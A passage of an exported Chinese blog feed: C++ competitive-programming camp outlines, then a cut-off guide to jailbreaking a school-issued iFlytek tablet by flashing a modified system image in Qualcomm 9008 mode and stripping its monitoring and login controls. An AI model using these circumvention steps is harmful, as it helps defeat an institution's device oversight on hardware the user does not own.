eps=1e-9;//给一个非常小的误差常数\n\nif(fabs(a-b)<=eps){\n    //a==b\n}else{\n    //a!=b\n}\n```\n\n- 正无穷\n  - 对于 `int` 类型，可以赋值为 `0x3f3f3f3f` 来将该变量的值变成正无穷，加一个负号就是负无穷\n  - 对于 `long long` 类型，可以赋值为 `0x3f3f3f3f3f3f3f3f`\n\n- `memset(arr,0,sizeof(arr))` memset可以批量给一个数组赋值，但只能赋值为一些简单值，比如1和0，2貌似就不太行了，如果你不太懂建议开for循环，或者写个代码测试一下能不能正确赋值\n  - `memset(arr,0x3f,sizeof(arr))` 可批量赋值为正无穷\n  - `memset(arr,-0x3f,sizeof(arr))` 可批量复制为负无穷\n\n- 潜在的致命错误：.size()的返回的**无符号**整数类型。无符号类型和有符号整数类型比较会出问题\n\n  ```cpp\n  #include<bits/stdc++.h>\n  using namespace std;\n\n  int main(){\n  \tstring a=\"\";\n  \tif(-1<a.size()){\n  \t\tcout<<\"a\";\n  \t}else{\n  \t\tcout<<\"b\";\n  \t}\n  \treturn 0;\n  }\n  ```\n\n  ```cpp\n  //正确的处理方案\n  #include<bits/stdc++.h>\n  using namespace std;\n\n  int main(){\n  \tstring a=\"\";\n  \tint len=a.size();\n  \tif(-1<len){\n  \t\tcout<<\"a\";\n  \t}else{\n  \t\tcout<<\"b\";\n  \t}\n  \treturn 0;\n  }\n  ```\n\n- 关于头文件\n  - `#include<iostream>` 中包含 `cout/cin/endl` 等\n  - `#include<string>` 中包含 `string` 类型等\n  - `#include<cstring>` 中包含 `strlen/memset` 等\n  - `#include<algorithm>` 中包含 `sort` 等\n  - `#include<cmath>` 中包含 `abs/fabs/sqrt` 等\n  - 你以后学习新东西之后可能都要记忆在哪个头文件中\n  - `#include<bits/stdc++.h>` 万能头，包含所有头文件\n\n**大谈输入输出**\n\n信竞中的输入是门学问\n\n- 方案一：cin/cout\n  - 优点就是简单\n\n  - 缺点就是有很多问题\n\n  - 速度比较慢，容易超时，虽然可以使用 `ios::sync_with_stdio(false);` 解决\n\n  - 出乎意料的输出\n\n  - ```cpp\n    //类型一：整数位很多\n    double x=12345678;\n    //类型二：小数位很多，有效小数位少\n    double y=0.00001234;\n    //类型三：小数位很多，有效小数位也多\n    double z=3.1415926;\n\n    cout<<x<<endl;\n    cout<<y<<endl;\n    cout<<z<<endl;\n\n    /*\n    输出结果\n    1.23457e+07\n    1.234e-05\n    3.14159\n    */\n    ```\n\n- 方案二：scanf/printf\n  - 优点：速度很快，而且可以自由控制输出\n\n  - 缺点：你可能要多学点东西\n\n  - 占位符：\n    - `%d`：int类型\n    - `%lf`：double类型\n    - `%s`：char数组类型\n    - `%c`：char类型\n    - `%.nlf`：保留 $n$ 位小数\n    - `%lld`：long long类型\n\n  - printf\n    - `printf(\"number:%d\",123)`\n    - 输出时，占位符位置会变成你传递的内容\n    - 有几个占位符就要额外传递几个参数\n    - 占位符和传递的参数的数据类型要匹配\n\n  - 就想输出百分号？`%%`\n\n  - 换行符 `\\n`\n\n  - 就想输出斜杠 `\\\\`\n\n  - scanf\n    - `scanf(\"%d\",&n)`\n    - 输入一个指定的内容，存到给定的变量中\n    - 变量前需要加 `&`\n    - 占位符和传递的参数的数据类型要匹配\n    - 读入字符串有点不同\n\n    ```cpp\n    //不要加 `&` 且 str 变量需要是一个char数组\n    char str[1003];\n    scanf(\"%s\",str);\n    printf(\"you input: %s\", str);\n    ```\n\n  - 你要是 `#define int long long` 之后直接 `printf(\"%d\", a)` 就寄啦！\n\n- 注意！\n  - 使用 `ios::sync_with_stdio(false);` 后，就不能再使用 `scanf/printf` 了，否则就寄啦！\n\n- 一个可能更好的方案\n  - 一般题目，只需要 `ios::sync_with_stdio(false);` + `cin/cout` 即可\n  - 如果遇到需要保留的小数的问题，`cin/cout` + `printf` 即可\n  - 不过建议有能力的同学可以考虑从现在开始就养成只用 `scanf/printf` 的习惯\n\n> 吾生也有涯，而知也无涯。\n> —— 庄子·内篇·养生主第三\n\n还有更多知识有待大家学习！\n\n## 6. 练习\n\n套题：CZOI Online #1 https://www.luogu.com.cn/contest/185344\n\n本次练习题按比赛的形式进行，各位可以提前看看洛谷的比赛功能怎么操作\n\n一定要交一下自己的名字！代码写完交完之后就不用再发到群里了\n\n额外附赠的几道题\n\n（练习取模）T217224 [CZOI2022\\]没有用的前缀和 https://www.luogu.com.cn/problem/T217224\n\n（练习前缀和）P8218 【深进1.例1】求区间和 https://www.luogu.com.cn/problem/P8218\n\n（练习前缀和）P5638 【CSGRound2】光骓者的荣耀 https://www.luogu.com.cn/problem/P5638\n\n一些适合初学者的近年真题\n\nP9752 [CSP-S 2023\\] 密码锁 https://www.luogu.com.cn/problem/P9752\n\nP9117 [春季测试 2023\\] 涂色游戏 https://www.luogu.com.cn/problem/P9117\n\nP7960 [NOIP2021\\] 报数 https://www.luogu.com.cn/problem/P7960\n\nP9868 [NOIP2023\\] 词典 https://www.luogu.com.cn/problem/P9868\n\n去年选拔赛的题目\n\nCZSC 2023（第一次）https://www.luogu.com.cn/training/359855\n\nCZSC 2023（第二次）https://www.luogu.com.cn/training/364201\n\n以下题目有难度（甚至适合给高二的学生练），仅供大佬研究（至少我们的选拔赛出不了这么难的题）\n\n（化简求和符号，当时作为21级模拟赛题目，仅一人做出）T269292 「FAOI-R1」A Simple Math Problem (D) https://www.luogu.com.cn/problem/T269292\n\n（推式子）P5686 [CSP-S2019 江西\\] 和积和 https://www.luogu.com.cn/problem/P5686\n\n（观察性质+前后缀和+考虑贡献）T351561 [CZOI Online #4\\] 序列 https://www.luogu.com.cn/problem/T351561 （这个题就看看吧，这题当时连轩神和金神都没搞出来）\n\n## 7. 关于选拔赛\n\nCZSC 2024 （第一次）https://www.luogu.com.cn/contest/188106\n\n","summary":"CZSC2024 第四次课，数组、循环、字符串","key":["czoi"],"tags":[{"value":"培训文件","color":"info"}],"path":["算法竞赛","CZOI","CZSC2024","四. 时间与空间.md"],"background":"https://www.caiwen.work/czoi2024.jpg","recommend":false,"status":"published"},{"type":"Article","title":"二. 数组、循环、字符串","id":"czsc2024-class2","createTime":"2024-07-21T04:27:00.000Z","updateTime":"2025-09-05T13:34:06.398Z","content":"\n::: info 说明\n本文为 沧州市第一中学信息学竞赛夏令营（CZSC2024） 第二次课程的课程大纲\n:::\n\n## 1. 数组\n\n**再谈变量——变量的作用域**\n\n- 作用域？\n- 定义的变量只能在自身作用域中使用\n- 作用域划分：以花括号划分，一个变量的作用域为最小包含它的花括号的区域\n- 不同作用域，变量名可以重复。使用变量时，如果有多个重名的，看最近的那个\n- 局部变量、全局变量\n- 局部变量默认值为随机数据，全局变量默认值为0\n  - 随机值？因人而异\n  - 陋习：局部变量不经初始化（赋值、cin输入）就使用\n\n- 什么是数组？\n- 定义方法：在定义变量时加方括号，方括号里写数组长度，于是这个变量就成为了一个数组\n- 数据长度必须是确定的数，不能是变量（\\*）\n- 使用：和变量一样。需要加上中括号使用。不能直接使用。使用的时候的中括号里就可以写变量了\n- 数组角标从0开始，换句话说，数组的第一个”格子“为0号”格子“\n- 显然，中括号里面不能是个负数\n- 常见错误：数组越界\n  - 如何避免？写代码的时候看清楚点。或是尽量开大一点，不要怕浪费，但也不要太大\n- 多维数组\n- 函数内最好不要定义数组。数组最好定义成全局变量。\n  - 局部变量的数组的数组长度不能太大\n  - 局部变量的数组默认值为随机数据\n\n## 2. 循环语句\n\n- 船新的运算符\n  - `i++` 表示直接把 `i` 加上1，等价于 `i=i+1`\n  - `i--` 同理\n  - `++i` 和 `--i` 也类似（\\*）\n  - `i+=n` 表示直接把 `i` 加上n，等价于 `i=i+n`\n  - `i-=n` `i*=n` `i/=n` `i%=n` 同理\n\n- while语句\n  - 语法：`while(条件){}`\n  - 如果条件满足，则执行花括号里的代码，执行完毕之后再次检查条件，如果条件仍成立，再次执行花括号代码，直到条件不成立\n  - `while(true){}` 死循环\n  - `break;` 跳出循环\n  - `continue;` 不再执行后面的代码，直接跳到本次循环。不会结束整个循环\n  - `return 0;` 直接结束程序\n    - break和continue是只能在for和while这种语句中使用，而return语句可以随时使用\n\n- for语句\n  - 语法：`for(初始化语句;条件语句;循环后执行语句){}`\n\n  - 等价于\n\n    ```c++\n    初始化语句;\n    while(条件语句){\n        ....\n        循环后执行语句;\n    }\n    ```\n\n  - 初始化语句中常用来定义变量\n\n  - 条件语句同while\n\n  - 花括号里的代码执行完毕之后就会执行一次第三个语句\n\n  - 经典示例 `for(int i=1;i<=n;i++){}`\n\n  - 三个语句都是可选的，且不能太复杂\n\n  - 初始化语句中创建的变量作用域仅限for语句\n\n  - 常见用法\n    - `for(int i=1;i<=n;i++){}` 从1循环到n、循环n次\n    - `for(int i=1;i<=10;i++){}` 从1循环到10、循环10次\n    - `for(int i=3;i<=13;i++){}` 从3循环到13、循环11次\n    - `for(int i=l;i<=r;i++){}` 从l循环到r、循环 `r-l+1` 次\n    - `for(int i=r;i>=l;i--){}` 从r倒着循环到l\n\n- while、for都能嵌套\n\n- 给数组赋值\n\n## 3. 题目选讲\n\n- 判断素数 https://www.luogu.com.cn/problem/B2128\n- 数字切割 https://www.luogu.com.cn/problem/B2082\n- 区间加问题 https://www.luogu.com.cn/problem/P3374\n\n## 4. 字符串\n\n- 字符，char 数据类型\n  - 单引号，单引号里面只能有一个字符\n\n  - ASCII 码（不用记）\n    ![](http://pic.caiwen.work/i/2025/01/24/67934ec296150.png)\n    ![](http://pic.caiwen.work/i/2025/01/24/67934ec219917.png)\n    - 观察发现：数字的ASCII码是连续的，小写字母的ASCII码是连续的，大写字母的ASCII码也是连续的\n    - char强制转成int可看到ASCII码\n    - int也可按ASCII码强制转成char\n\n    - char能进行运算，运算时先强制转化为int（对应ASCII码）\n\n- 字符串\n  - string 数据类型\n    - 可以当数组使用\n    - size()函数\n    - 可以用来判等\n  - char数组\n    - 可以拿string类型的字面量来赋值\n    - 可以直接输入\n    - 可以直接输出\n    - 不能直接用来判等\n      - 应该考虑开个循环来判等\n    - strlen()获取长度\n\n## 5. 题目选讲\n\n- 大小写字母转化 https://www.luogu.com.cn/problem/P5733\n- 数字反转 https://www.luogu.com.cn/problem/P5705\n  - 注意数据可能存在末尾有0情况，需要特判\n\n## 6. 练习\n\n- https://www.luogu.com.cn/problem/P5722\n- https://www.luogu.com.cn/problem/U324837\n- https://www.luogu.com.cn/problem/P5726\n- https://www.luogu.com.cn/problem/P1047\n- （字符串+素数）https://www.luogu.com.cn/problem/P1125\n- （有点难、开桶）https://www.luogu.com.cn/problem/P2141\n\n","summary":"CZSC2024 第二次课，数组、循环、字符串","key":["czoi"],"tags":[{"value":"培训文件","color":"info"}],"path":["算法竞赛","CZOI","CZSC2024","二. 数组、循环、字符串.md"],"background":"https://www.caiwen.work/czoi2024.jpg","recommend":false,"status":"published"},{"type":"Article","title":"一. C++ 编程初探","id":"czsc2024-class1","createTime":"2024-07-17T11:41:00.000Z","updateTime":"2025-09-05T13:34:06.450Z","content":"\n::: info 说明\n本文为 沧州市第一中学信息学竞赛夏令营（CZSC2024） 第一次课程的课程大纲\n:::\n\n## 0. 准备工作\n\n- 什么是C++？信息学竞赛？信息学竞赛基本流程？\n- Dev-C++\n\n## 1. A+B Problem\n\n- 你需要编写一个程序，输入两个整数a和b，然后输出这两个整数之和。\n- 基本规则：\n  - 缩进\n  - 程序的代码在{}里写，其他部分先不需要了解也不需要动\n  - 每个语句最后都要加分号\n\n  - 使用英文符号\n\n- 注释\n  - 注释的内容将被忽略，不会被执行\n  - 单行注释\n  - 多行注释\n- 我需要背吗？\n\n## 2. 数据类型与变量\n\n- 变量是什么？\n- 变量定义方法：`数据类型 变量名;`\n\n- 什么是数据类型？\n- 常见数据类型：整数，小数，字符，字符串，布尔类型....\n- `int` 为整数\n- `double` 为小数\n\n- 变量名不能数字开头，不能是一些名称（比如int，try）（\\*）\n- 一口气定义多个变量：`数据类型 变量名,变量名,变量名....;`\n- 定义变量后才能够使用\n- 不能重复定义变量（\\*）\n- 变量可以在定义时赋值（变量赋值，数字赋值）\n  - =是赋值不是等于\n- 变量的默认值是随机数据（\\*）\n\n## 3. 输入输出\n\n- 什么是输入输出\n\n- 读法：c in c out\n- 使用方法：`cin/cout都放在左边，cin用>>，cout用<<`\n- cin输入 cout输出\n- cin和变量一起用\n- 可以输出算式，变量，数字\n- 连续使用`<<` `>>`\n- 输出文字：双引号包围\n- 输出换行符：`endl`\n\n## 4. 整数与小数运算\n\n- 加减\n- 乘法 `*`，除法 `/`\n- 可以用括号 `()` ，先算括号里的\n- 取模 `%`\n  - 取余数\n\n  - 有一些用处（\\*）\n\n由除法引发的一系列讨论\n\n**再谈数据类型**\n\n- 字面量的数据类型\n- 赋值时存在的强制数据类型转换\n  - double强制转换成int时小数丢失\n- 同种数据类型运算，运算结果的数据类型不变\n- 不同种数据类型运算，低精度强制转换为高精度数据类型，转化为上述情况\n- 手动的强制数据类型转换，既可以作用变量，也可以作用字面量\n\n- 除\n  - 各种操作\n    - `int c=a/b`\n    - `double c=a/b`\n    - `a/b`\n    - `3/2`\n    - `double c=(double)a/b`\n    - `double c=1.0*a/b`\n    - `double c=a/b*1.0`\n\n    - 到底怎么办！？大不了写一堆 `(double)`\n\n  - 灵异事件\n    - 计算机在计算无限小数的时候会出现偏差\n\n      ```cpp\n      printf(\"%.10lf\\n\",c);\n      printf(\"%.10lf\\n\",a+b);\n      printf(\"%.20lf\\n\",c);\n      printf(\"%.20lf\\n\",a+b);\n      ```\n\n    - 如何判等？（\\*）\n\n不要恐慌，oi中关于小数的问题比较少，搞不清楚问题不大\n\n## 5. 题目选讲\n\n- 将两个变量进行交换\n- 把一个三位数反转\n\n## 6. 分支语句\n\n- 语法 `if(条件){}`\n\n- `()` 里的条件成立，就执行花括号里的代码\n\n条件怎么写？\n\n- `==`：判断是否相等\n  - =：赋值\n\n  - ==：判等\n\n- `!=`：判断不相等\n- `> < >= <=` ：只能比较数字，不必多说\n  - 不能连用\n- `&&`：与，将两个条件连接，两个条件都满足才可以\n- `||`：或，有一个条件满足就可以（\\*）\n  - 上述两个运算符可以连用 `a==b && b==c && c==a`\n  - 套用 `(a==b && b==c) || (a>0 && b>0 && c>0)`\n\n- if可以嵌套使用\n\n- 可附加 else，在 `()` 里的式子不成立时执行\n- else if，可以接着判断。\n  - 可以附加多个 else if\n  - 可以再加else\n  - 有一个 `if` 成立了就不再继续判断\n\n## 7. 题目选讲\n\n- 上取整\n  - 两个新的数学符号\n  - $\\left \\lceil a \\right \\rceil $：将a向上取整，$\\left \\lceil 1.2 \\right \\rceil = 2$\n  - $\\left \\lfloor a \\right \\rfloor $：将a向下取整，$\\left \\lfloor 1.9 \\right \\rfloor = 1$\n\n- 将三个数从小到大排序\n\n## 8. 练习\n\n不要恐慌，一般练习题都比课上讲的题简单\n\n### [NOIP2017 普及组] 成绩\n\n**题目描述**\n\n牛牛最近学习了 C++ 入门课程，这门课程的总成绩计算方法是：\n\n$$\n\\text{总成绩}=\\text{作业成绩}\\times 20\\%+\\text{小测成绩}×30\\%+\\text{期末考试成绩} \\times 50\\%\n$$\n\n牛牛想知道，这门课程自己最终能得到多少分。\n\n**输入格式**\n\n三个非负整数 $A,B,C$，分别表示牛牛的作业成绩、小测成绩和期末考试成绩。相邻两个数之间用一个空格隔开，三项成绩满分都是 $100$ 分。\n\n**输出格式**\n\n一个整数，即牛牛这门课程的总成绩，满分也是 $100$ 分。\n\n**样例 #1**\n\n样例输入 #1\n\n```\n100 100 80\n```\n\n样例输出 #1\n\n```\n90\n```\n\n**样例 #2 **\n\n样例输入 #2\n\n```\n60 90 80\n```\n\n样例输出 #2\n\n```\n79\n```\n\n**提示**\n\n**样例 1 说明**\n\n牛牛的作业成绩是 $100$ 分，小测成绩是 $100$ 分，期末考试成绩是 $80$ 分，总成绩是 $100 \\times 20\\%+100 \\times 30\\%+80 \\times 50\\%=20+30+40=90$。\n\n**样例 2 说明**\n\n牛牛的作业成绩是 $60$ 分，小测成绩是 $90$ 分，期末考试成绩是 $80$ 分，总成绩是 $60 \\times 20\\%+90 \\times 30\\%+80 \\times 50\\%=12+27+40=79$。\n\n**数据说明**\n\n对于 $30\\%$ 的数据，$A=B=0$。\n\n对于另外 $30\\%$ 的数据，$A=B=100$。\n\n对于 $100\\%$ 的数据，$0≤A,B,C≤100$ 且 $A,B,C$ 都是 $10$ 的整数倍。\n\n### 判断是否为两位数\n\n**题目描述**\n\n判断一个正整数是否是两位数（即大于等于 $10$ 且小于等于 $99$）。\n\n**输入格式**\n\n一个正整数，不超过 $1000$。\n\n**输出格式**\n\n一行。若该正整数是两位数，输出 $1$，否则输出 $0$。\n\n**样例 #1**\n\n样例输入 #1\n\n```\n54\n```\n\n样例输出 #1\n\n```\n1\n```\n\n### 判断能否被 3，5，7 整除\n\n**题目描述**\n\n给定一个整数 $x$，判断它能否被 $3$，$5$，$7$ 整除，并输出以下信息：\n\n1、能同时被 $3,5,7$ 整除（直接输出 `3 5 7`，每个数中间一个空格）；\n\n2、只能被其中两个数整除（按从小到大的顺序输出两个数，例如：`3 5` 或者 `3 7` 或者 `5 7`，中间用空格分隔）；\n\n3、只能被其中一个数整除（输出这个除数）；\n\n4、不能被任何数整除，输出小写字符 `n`。\n\n**输入格式**\n\n输入一行，包括一个整数 $x$。\n\n**输出格式**\n\n输出一行，按照描述要求给出整数被 $3$，$5$，$7$ 整除的情况。\n\n**样例 #1**\n\n样例输入 #1\n\n```\n105\n```\n\n样例输出 #1\n\n```\n3 5 7\n```\n\n**提示**\n\n数据规模与约定\n\n对于全部的测试点，保证 $1 \\leq x \\leq 200$。\n\n","summary":"CZSC2024 第一次课，变量与数据类型、输入输出、整数与小数、分支","key":["czoi"],"tags":[{"value":"培训文件","color":"info"}],"path":["算法竞赛","CZOI","CZSC2024","一. C++ 编程初探.md"],"background":"https://www.caiwen.work/czoi2024.jpg","recommend":false,"status":"published"},{"type":"Article","title":"科大讯飞X1PRO课堂版破解探究","id":"iflytek-x1pro","createTime":"2023-12-06T03:08:00.000Z","updateTime":"2025-09-05T13:34:05.564Z","content":"\n高三，学校发了平板。大概看了一下，是科大讯飞x1pro课堂版。平板只能打开有限的几个软件（实际上有用的只有一个智学网），于是考虑破解。\n\n最终成果：\n\n![使用Nova启动器](https://www.caiwen.work/wp-content/uploads/2023/12/v2-fe190eed2ab667d05260f053a800f078_1440w.png)\n\n![b站，注意b站原版没有平板适配，要用hd版本](https://www.caiwen.work/wp-content/uploads/2023/12/v2-425cc901acdca1514f324b251a7684d7_1440w.png)\n\n本文将会介绍一下破解的思路。如果你对破解思路不敢兴趣的话可以跳读。个人觉得这个破解思路具有普遍性，即使你的平板型号不是x1pro课堂版，也可以仿照本文思路破解其他型号的平板。\n\n## 前人的破解方案\n\n要破解平板，第一件事自然就是直接去百度上搜索。网上搜到的方法，大部分是先下载“洋葱数学”，然后通过bug安装一个叫“创建快捷方式”的应用，然后打开隐藏的设置界面，打开开发者选项，从而实现adb调试，做到自由安装其他应用。实际上，x1pro分为课堂版和市场版。上述方法只适用于市场版（貌似市场版还把这个bug修复了），课堂版应用商店里根本没有洋葱数学。因此这个方法失效。\n\n还考虑过其他的方法，比如登录界面按三下屏幕左下角，按一下屏幕右下角，可以弹出本地管理员界面，但是密码不知道，网上公开的密码不正确。\n\n如果你够牛逼的话还可以把老师的平板偷过来，据说老师的平板上可以下发软件。我所在的学校上一届有人用这个办法给每人传了个音游，然后被学校发现，我们这届老师就不给发平板了。\n\n## 刷入修改镜像\n\n继续搜索，我看到了这个网站 https://supersuroot.github.io/ 。\n\n这是我们破解平板的突破点。我们照着这个教程走一遍。由于这个教程比较简陋，所以下文会对此进行补充。\n\n首先这个网站的百度网盘文件失效了，不过好在对应的github的discussion板块有好人补了下文件。我把链接直接放到这里：https://www.123pan.com/s/vxgrVv-8mu9A\n\n这里面有下面几个文件，我们简单介绍一下∶\n\n- prog开头的那个文件∶引导文件，后续刷机的话需要。\n- qpst∶刷机工具\n- system.zip：刷机包，下载后解压，会得到img文件，后文所说的img镜像就是这个img文件\n- 高通9008刷机工具：又一个刷机工具\n- 高通usb：usb驱动\n\n先安装usb驱动，然后安装qpst工具。\n\n然后确保平板充好电。\n\n接下来把平板后盖拆开。首先你需要把平板外套弄下来，然后用卡针把侧面的卡槽取出（没想到吧，这平板还有卡槽），否则后盖弄不下来。然后用指甲盖从平板的卡槽附近，或者是角上，尝试撬开。这个步骤可能比较难搞，不过确实是可以拆下来的。到后面可能要用力掰开后盖，因为后盖和平板粘有双面胶，需要用点力气。\n\n撬开之后我们需要进入9008模式。此时你的平板**必须处于关机状态**，并且**不能插数据线**。我们需要准备一个铜丝（或者其他能导电的东西，最好硬一点）来短接。当然，你没有铜线的话，也可以用剪刀来短接，不过可能成功概率会低一点（因为剪刀的尖比较粗）。为了方便，你可以打开电脑声音，然后先把数据线一头连接电脑。让铜丝接触如图所示的两个位点，短接。保持短接（不能只短接一下就不短接了，保持短接），然后将数据线另一头插入平板。如果电脑出现新设备接入的提示音，说明平板成功进入9008模式。\n\n上述步骤有一点差错都会导致失败，请务必看清楚。\n\n![短接位点是靠近typec接口的](https://www.caiwen.work/wp-content/uploads/2023/12/QQ%E6%88%AA%E5%9B%BE20231206114536.png)\n\n然后打开qpst，按照下面这个教程走，备份分区，防止后续操作不当，平板变砖：https://zhuanlan.zhihu.com/p/35422254?utm_id=0\n\n::: info 注意\n分区管理器中列出了平板上的所有分区。注意最好不要用鼠标滚轮进行滑动，因为鼠标直接滚动的话列表的滚动幅度过大，会导致你可能找不到你想要操作的分区。建议点击右侧滚动条上下的箭头，慢慢滚动。\n:::\n\n分区的说明如下：\n\n- system：安卓系统存放在这个分区。这个是你一定要备份的。万一变砖了，或者平板破解被学校发现了，刷入已经备份好的system分区文件可恢复到原来的系统。\n\n- cache：理论上讲刷完机之后需要清空userdata分区和cache分区，因此cache分区不备份也没关系，但科大讯飞对平板魔改了一下，cache分区中可能含有重要文件，如果后续不小心把cache分区清空了，将会导致平板无法开机（已经有人中招了）。所以这个也是你一定要备份的。\n\n- userdata：这个分区不要备份，这玩意十好几个g，备份慢，而且这个分区加密了，备份了没用。这个分区即使情空也无非是原来平板上的用户数据全部丢失，不至于开不开机。而且我们后面还要清空这个分区。\n\n综上，我们备份 system 分区和 cache 分区。备份后的分区存放在“C:\\Users\\你电脑的用户名\\AppData\\Roaming\\Qualcomm\\QFIL\\端口名称”中。你需要保证C盘有充足的空间。比较坑的是备份后的文件的文件名中不会有分区名称，这就会导致如果你一口气备份好几个分区，你可能最后无法分辨哪个文件对应哪个分区。这里建议每备份完一个分区，将分区文件重命名一下，以便区分。\n\n![备份后的分区（图中标出来的是我做的标记，用于区分哪个文件对应哪个分区）](https://www.caiwen.work/wp-content/uploads/2023/12/QQ%E6%88%AA%E5%9B%BE20231206120212.png)\n\n::: info 插一嘴\n这里插一嘴，如果中间发生了什么意外，可能出现把数据线拔了，但是平板还处于9008模式，再插上数据线电脑也识别不到，或者识别到了但是进行一些操作时有报错。这时候你需要手动退出9008分区，具体操作就是同时按下电源键+音量减键，一直按着，直到平板开机（可能要按十几秒）\n:::\n\n然后退出那个qpst。退出的同时平板也会退出9008模式，你需要重新再进入一下9008模式，打开9008刷指定分区的工具，分区名称填“system”，文件路径选择解压好的img镜像，引导路径选择引导文件，点击开始，即可进行刷入。输入成功会有提示，然后你可以拔掉数据线，然后开机。\n\n::: info 补充说明\n实际上QFIL也可以刷制定分区。但是官方的工具在刷分区时经常出现进度条瞬间跑完，实际上没刷进去的情况，所以选择了第三方工具。\n:::\n\n不出意外你会看到鸿蒙的开机动画（不要以为自己刷入了鸿蒙系统，只是个开机动画）。\n\n如果这么顺利就成功了，也就没有这篇文章了。\n\n后续根据网站上的教程所说，连续点击版本号输入密码进入开发者选项。但你会发现连设置你都找不到。因此上述教程失效。但我们还是有所收获，这个刷机包是基于原版刷机包修改的，但只修改了两个地方：开机动画，还有相册里可以播放视频了。实际上这个刷机包的作者可以再多改点东西的\n\n## 魔改镜像\n\n到此为止，全网的破解教程都失效了。\n\n然后我考虑，既然那个刷机包的作者可以对原版镜像做修改，那我能不能也修改一下呢？于是就有下面的内容。\n\n根据b站up主晨钟酱的一期视频：https://www.bilibili.com/video/BV19p4y1N7H8 ，（我们只需要看解包img镜像的部分，使用drt工具对之前得到的img镜像解包），解包后可以修改镜像里的文件，然后打包，刷入平板（这一顿操作后面会经常用）。\n\n这里注意的是，原则上你刷完机要清空userdata分区。否则对刷机包的修改不能正常应用到平板里。\n\n下面我们细说修改镜像\n\n### 增加/删除apk\n\n将镜像解包后，会看到很多文件夹，其中系统自带的软件存放在了“app”文件夹里。我们可以直接删除一些 apk。如果你需要装软件的话，直接把 apk 丢进去即可。\n\n你可能直接大喜，这不就可以做到安装软件了吗，直接把什么“创建快捷方式”丢进去然后开启开发者模式，就和网上其他的教程一样不就好了。我一开始就是这么想的。我一开始丢了个“创建快捷方式”，打包刷进去，确实开机后看到了，也能用，但连点版本号，提示“你已处于开发者模式”，然后用这个软件打开开发者选项，却提示“你未处于开发者模式”。这就离大谱了，可见科大讯飞还是有点脑子的，把开发者模式毙了，因此这条路走不通。\n\n你可能又想到了，那我不搞什么adb，直接像这样安装软件不也行吗。我也想到了，丢了个via浏览器进入，打开之后，发现除了科大讯飞官网，智学网，畅言官网之外的网站一律打不开，甚至局域网也不行！连了自己的热点，仍然是这样。错误信息是“CONNECT_REFUSED”，不难猜到，应该是科大讯飞在系统里搞了个什么网络限制。\n\n这样的话意味着你只能玩一些不需要联网的软件，或许你仍然满意了，但你考虑，你需要把apk放入app文件夹里，然后打包，然后刷入，还要清userdata分区，然后第一次开机还非常慢，非常麻烦，一套下来可能要好几十分钟。更要命的是，这样安装的软件可能会缺少一些库文件，也就是打开会提示停止运行，这也就意味着你有相当一部分软件是不能安装的。\n\n而且平板上安装有管控平台，可能会被老师发现，十分危险。\n\n我测试了几个软件，他们的情况如下：\n\n- Activity Manager、创建快捷方式、es文件管理器、fv文件管理器、geogebra、Haruka文件管理器、nova启动器、treble info、via浏览器：均可正常使用。\n\n- wps：如果不清userdata，即使刷进去也会被原来自带的wps替换掉。清除userdata则可以正常使用。\n\n- Edge浏览器、质感文件管理器、冰箱、智学网学生端、智学网家长端，MT管理器：无法使用。\n\n- 安装狮：这个非常奇怪，放入app文件夹里，打包img然后刷进去，开机后会显示系统被损坏。即无法开机。\n\n- magisk：可以打开，但是提示无法安装为系统应用。\n\n下面着重介绍几个应用：\n\n- IFlySCLauncher：平板在登录后进入的界面，即自带的桌面。你可以直接把这个东西删了，但是删了之后需要在app文件里放置一个启动器（比如nova启动器）。\n\n- IFlySCMdmAdmin：本机管理，后面再说。\n\n- IFlySCMdmService：管控平台，后面再说。\n\n- IFlySCLogin：登录界面。如果你把上述的应用删除后，你就不得不删掉这个了，因为平板在登录时会检查一些应用是否缺失，缺失则不允许登录。经测试检查应用缺失仅检查包名。但我尝试将管控平台删掉，把其他应用的包名改成管控平台的包名，发现仍然登录不了。\n\n这里我选择把科大讯飞自带的垃圾“学习软件”全部删掉，即“app”文件夹里带“IFly”前缀的文件夹一律删掉，但是只保留“IFlyIMESigned”（讯飞输入法）。然后放入下面5个关键的软件（对应的apk文件在文末会给出）。\n\n- nova启动器：我们把IFlySCLauncher删了，所以需要一个新的启动器。\n\n- via浏览器\n\n- Activity Manager：我们后面会使用这个来打开一些被系统隐藏了的东西\n\n- es文件管理器和fv文件管理器：es文件管理器可以进行局域网传文件，还有比较好用的文件管理。fv文件管理器不好用，但是他可以在后面安装apk的时候弹出允许安装未知来源的设置。\n\n其他的apk先不要放！后面将平板完全破解后再安装也不迟。\n\n打包，刷入，清空userdata分区，开机，开机后就能进入到新的桌面了。\n\n实际上，我们把管控平台删掉后，平板的蓝牙功能可用。在activity manager中找到蓝牙设置，打开，可通过蓝牙与手机传输文件。\n\n你可能又大喜，我直接通过蓝牙传apk，直接安装，这样也够用了。这个想法我也试了，传完apk后，直接用es文件管理器打开，会提示“出于安全考虑，已禁止您的平板安装此来源的未知应用”。好在如果你使用fv文件管理器，他会先跳转到设置里，让你打开允许fv管理器安装apk，然后再继续安装。但安装到一半，会弹出“应用未安装。”。显然科大讯飞在这上面又做了限制。\n\n实际上管控平台去了之后平板还能开热点了，可以用es文件管理器，点击文件快传，然后他会让你开热点。你可能想到，科大讯飞应该只限制了平板访问外界，没限制外界访问平板吧。但很不幸，平板打开热点后，其他设备根本连不上平板。\n\n于是下面的问题仍然棘手：突破网络限制与安装apk。\n\n### 关于管控平台的研究\n\n管控平台及上文所说的 IFlySCMdmService。这个东西有下面几个作用：\n\n- 监控平板使用：包括但不限于你点开了什么软件，关闭了什么软件，以及各种日志什么的。有意思的是，他并不会监控你的屏幕，也就是说理论上学校那边是看不到你的屏幕的。\n\n- 做登录校验：如上文所述，管控平台缺失会导致你无法登录，因此删除了管控平台你不得不也把登录界面也删掉。\n\n- 